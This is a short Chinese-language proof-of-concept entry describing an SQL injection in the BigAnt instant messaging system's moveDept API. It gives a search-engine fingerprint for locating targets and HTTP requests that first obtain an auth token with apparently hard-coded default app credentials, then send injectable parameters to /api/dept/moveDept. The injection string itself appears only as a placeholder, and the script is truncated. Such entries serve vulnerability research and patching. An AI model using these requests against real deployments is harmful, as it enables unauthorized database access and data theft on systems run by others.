# 大蚂蚁(BigAnt)即时通讯系统moveDept存在SQL注入漏洞

- **系统**：大蚂蚁(BigAnt)即时通讯系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`product="即时通讯系统"`
- **请求**：`POST /api/oauth/create_authen HTTP/1.1`

**请求体 / payload**
```
获取认证码
Host: www.hacktwohub.com
Content-Type: application/x-www-form-urlencoded
uid=1&app_id=system&app_secret=www.upsoft01.com&ssid=CC1743B5-E5D5-42CE-B5F6-42E24464C8D0
使用获取到的authen：
cc7e6a614831d1c6b351a5f12678ed4b94cf98b2a52b1050d6c19433fdeff37d
SQL注入
两个参数均存在SQL注入
多种thinkphp传参、路由模式需要注意
POST /api/dept/moveDept HTTP/1.1
Host:www.hacktwohub.com
Content-Type: application/x-www-form-urlencoded
authen=cc7e6a614831d1c6b351a5f12678ed4b94cf98b2a52b1050d6c19433fdeff37d&uid=1&dept_id=SQLI_POC
POST /index.php?s=/api/dept/moveDept HTTP/1.1
Host: www.hacktwohub.com
Content-Type: application/x-www-form-url…（脚本共 727 字，完整版见原文）
```
- **预期**：200　|　—